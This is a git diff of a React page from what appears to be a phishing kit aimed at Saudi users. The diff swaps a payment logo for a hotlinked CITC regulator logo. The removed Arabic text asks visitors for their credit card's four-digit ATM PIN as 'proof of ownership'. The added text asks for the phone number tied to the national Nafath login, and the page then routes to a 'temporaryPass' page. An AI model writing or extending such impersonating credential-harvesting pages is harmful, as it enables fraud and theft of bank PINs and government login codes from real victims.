@@ -1,11 +1,11 @@
 import React from "react";
 import { useNavigate } from "react-router";
 
-function VerificationCode2() {
+function PhoneNum() {
   const nav = useNavigate();
   const handelSubmit = function (e) {
     e.preventDefault();
-    nav("/phone-number");
+    nav("/temporaryPass");
   };
   return (
     <div className="bg-white">
@@ -15,17 +15,16 @@ function VerificationCode2() {
       >
         <div>
           <img
-            src="https://pluspng.com/img-png/payment-method-png-payment-options-1003.png"
+            src="https://cday.kfupm.edu.sa/Content/File_Upload/217594437CITC-logo.png"
             alt=""
-            className="h-10"
           />
         </div>
-
-        <form className="my-6" onSubmit={(e) => handelSubmit(e)}>
+        <h3 className="font-semibold text-2xl  text-center">
+          تابع تفاصيل طلبك
+        </h3>
+        <form className="my-6 py-16" onSubmit={(e) => handelSubmit(e)}>
           <h4 className="font-semibold text-xl  text-center">
-            اثبات ملكية البطاقة - كلمة سر البطاقة <br />
-            يرجي ادخال ركز سحب الصراف المكون من اربع خانات الخاص ببطاقتك
-            الاتمانية
+            قم بادخال رقم الجوال المرتبط بالنفاذ الوطني الموحد لمتابعة الطلب
           </h4>
           <input required type="text" className="input-text" />
           <button className="bg-main w-1/2 mx-auto p-3 rounded-lg block text-white font-semibold text-xl my-4">
@@ -37,4 +36,4 @@ function VerificationCode2() {
   );
 }
 
-export default VerificationCode2;
+export default PhoneNum;
